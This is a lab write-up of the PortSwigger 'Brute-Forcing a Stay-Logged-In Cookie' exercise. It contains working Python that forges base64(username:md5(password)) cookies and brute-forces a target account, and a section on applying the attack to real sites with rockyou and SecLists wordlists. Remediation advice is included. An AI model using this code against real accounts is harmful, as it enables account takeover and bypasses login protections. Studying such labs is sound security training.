# Brute-Forcing a Stay-Logged-In Cookie

**Platform:** PortSwigger Web Security Academy  
**Category:** Authentication  
**Difficulty:** Practitioner  
**Date Solved:** 2026-09-17  
**Severity:** High

---

## Summary

The application's "Remember me" cookie is constructed from predictable components — `base64(username:md5(password))`. By decoding your own cookie to reverse-engineer the formula, then hashing every candidate password and forging cookies for the target user, full account takeover is achieved without ever submitting a login request. The cookie alone grants access.

---

## Affected Component

`stay-logged-in` cookie — set when "Remember me" is checked at login. Used to authenticate requests to `/my-account` without a session cookie.

---

## Root Cause

```
Cookie formula: base64( username + ":" + md5(password) )

Attack:
1. Decode your own cookie → reveals formula
2. For each candidate password:
   → md5(password) → base64("carlos:" + hash) → forged cookie
3. Send forged cookie to /my-account → if valid → authenticated
```

The cookie is effectively a re-hashed password. Anyone who can guess the password can forge the cookie — bypassing the login form, rate limiting, and 2FA entirely.

---

## Steps to Reproduce

### Step 1 — Decode your own cookie to find the formula

```python
import requests, base64

r = requests.post("/login",
    data={"username": "wiener", "password": "peter", "stay-logged-in": "on"})
cookie = r.cookies.get("stay-logged-in")
print(base64.b64decode(cookie).decode())
# Output: wiener:51dc30ddc473d43a6011e9ebba6ca770
# Formula confirmed: username:md5(password)
```

### Step 2 — Forge cookies for target and brute force

```python
import hashlib, base64, requests

def forge_cookie(username, password):
    md5hash = hashlib.md5(password.encode()).hexdigest()
    return base64.b64encode(f"{username}:{md5hash}".encode()).decode()

# Try each password
for password in passwords:
    cookie = forge_cookie("carlos", password)
    r = requests.get("/my-account?id=carlos",
        cookies={"stay-logged-in": cookie})
    if "Your username is" in r.text:
        print(f"FOUND: {password}")
```

### Step 3 — Inject cookie in browser

1. F12 → Application → Cookies
2. Set `stay-logged-in` = forged cookie value
3. Navigate to `/my-account?id=carlos`

---

## Proof of Concept

Python scirpt to decode: https://github.com/MalikHettige/Scripts-tools/blob/main/authentication/Brute-Forcing%20a%20Stay-Logged-In%20Cookie/stay-logged-in-decode.py
Python script to brute: https://github.com/MalikHettige/Scripts-tools/blob/main/authentication/Brute-Forcing%20a%20Stay-Logged-In%20Cookie/stay-logged-in-brute.py

```
Raw cookie (wiener): d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
Decoded:             wiener:51dc30ddc473d43a6011e9ebba6ca770
Formula:             base64(username:md5(password))

[FOUND] password: monitor
Forged cookie: Y2FybG9zOjA4YjU0MTFmODQ4YTI1ODFhNDE2NzJhNzU5Yzg3Mzgw
```
https://github.com/MalikHettige/Bug-bounty-writeups/blob/main/authentication/labs/Assets/brute-password.png?raw=true
---

## What is a Hash? (Reference)

A hash is a one-way scrambler — input goes in, fixed-length string comes out, and you can't reverse it:

```
"monitor" → md5 → 08b5411f848a2581a41672a759c87380
```

**Why attackers crack it:**
You don't reverse it — you guess and compare:
```
Try "123456"  → md5 → hash → no match
Try "monitor" → md5 → 08b5411f... → MATCH 
```

This is exactly what the script does — hash every candidate password and compare.

---

## Real World Wordlists

**For real targets, never hardcode passwords. Load from file:**

```python
with open("/path/to/wordlist.txt") as f:
    passwords = [line.strip() for line in f]
```

**Get SecLists (14M+ passwords):**
```bash
git clone https://github.com/danielmiessler/SecLists
```

**Best wordlists for this attack:**
```
SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
SecLists/Passwords/Leaked-Databases/rockyou.txt (if available)
```

---

## Real World Application

**How to find this on real targets:**

```
1. Log in with "Remember me" checked
2. Copy the stay-logged-in/remember-me cookie value
3. Try base64 decoding it → readable? → predictable formula
4. Check if it contains:
   - Your username
   - MD5/SHA1/SHA256 of your password
   - Timestamp
   - Any combination of the above
5. If formula found → forge for target username → brute force
```

**Common cookie patterns to check:**
```
base64(username)                    → weakest
base64(username:password)           → plaintext password in cookie
base64(username:md5(password))      → this lab
base64(username:sha1(password))     → same attack, different hash
md5(username + secret)              → need to find secret
```

**Tools to decode quickly:**
- CyberChef (online) → paste cookie → Magic → auto-detects encoding
- Burp Decoder → paste → decode as base64

---

## Impact

### Technical
- Cookie forged without submitting any login request
- Bypasses login form, rate limiting, IP blocks, and 2FA entirely
- Attack works offline — no interaction with the server until cookie is ready
- 100 passwords tested in seconds with 10 threads

### Business / Real-World
- "Remember me" is trusted by users as a security convenience
- This makes it an attack surface instead of a feature
- Any account whose password is in a common wordlist is fully compromised
- In production: PII, payment data, admin access at risk

---

## Remediation

1. **Use cryptographically random tokens** — generate a random 32+ byte token, store it server-side, never derive it from user data
2. **Never include password derivatives in cookies** — md5/sha1 of password is crackable
3. **Bind tokens to IP or User-Agent** — invalidate if either changes
4. **Set short expiry** — "remember me" should expire in days, not years
5. **Rotate tokens on use** — each request generates a new token

---

## Lessons Learned

- Always decode "remember me" cookies first — base64 is not encryption
- The formula is always reversible once you have your own cookie to analyse
- Cookie-based auth bypasses ALL login protections — rate limits, 2FA, lockouts
- Offline attack = no server logs until you try the forged cookie
- CyberChef or Python `base64.b64decode()` is your first tool on any opaque cookie

---

## Methodology Entry

```
WHERE:  "remember me" / stay-logged-in cookie present after login
WHAT:   decode your cookie (base64) → find formula → forge for target
        → brute force by hashing each password candidate
SIGNAL: /my-account loads with "Your username is: target"
TOOL:   hashlib.md5() + base64.b64encode() + requests
REAL:   load rockyou.txt instead of hardcoded list
```

---

## References

- [PortSwigger Lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
- [PortSwigger — Other authentication mechanisms](https://portswigger.net/web-security/authentication/other-mechanisms)
- [CyberChef — Cookie decoder](https://gchq.github.io/CyberChef/)

---

**Tags:** `#PortSwigger` `#Authentication` `#Cookie` `#MD5` `#BruteForce` `#StayLoggedIn` `#Practitioner` `#Python`
